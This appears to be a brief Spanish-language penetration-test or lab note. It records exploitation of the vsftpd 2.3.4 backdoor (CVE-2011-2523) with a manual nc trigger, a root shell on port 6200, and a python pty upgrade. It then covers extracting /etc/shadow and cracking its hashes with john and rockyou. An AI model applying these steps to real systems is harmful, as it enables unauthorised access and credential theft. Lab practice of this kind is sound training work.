Puerto: 21
Servicio y versión: vsftpd 2.3.4
Hallazgo: Anonymous FTP + backdoor conocido (CVE-2011-2523)
Investigación: searchsploit vsftpd 2.3.4 → unix/remote/49757.py
Explotación: trigger manual con nc (USER nergal:) + PASS pass), shell root en puerto 6200
Post-explotación:
  - TTY estabilizada con python -c 'import pty; pty.spawn("/bin/bash")'
  - /etc/shadow extraído, 6/7 hashes crackeados con john + rockyou
    (root NO crackeado — contraseña no está en rockyou.txt)
  - ifconfig: sin segunda interfaz, no hay pivoting posible en este host
